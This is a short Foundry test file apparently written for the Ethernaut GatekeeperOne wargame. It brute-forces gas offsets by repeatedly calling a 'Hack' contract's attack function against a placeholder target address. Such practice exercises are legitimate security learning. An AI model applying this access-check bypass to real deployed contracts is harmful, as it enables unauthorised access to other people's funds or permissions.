// SPDX-License-Identifier: WTFPL
pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "src/gatekeeperOne.sol";

contract TestGateKeeperOne is Test {
    Hack private hack;

    function setUp() public {
        hack = new Hack("<GATEKEEPER_ONE_ADDRESS>");
    }

    function getGasLeft() public {
        for (uint256 i = 0; i < 8191; i++) {
            try hack.attack(i) {
                console.log("gas", i);
                return;
            } catch {}
        }
        revert("all failed");
    }
}
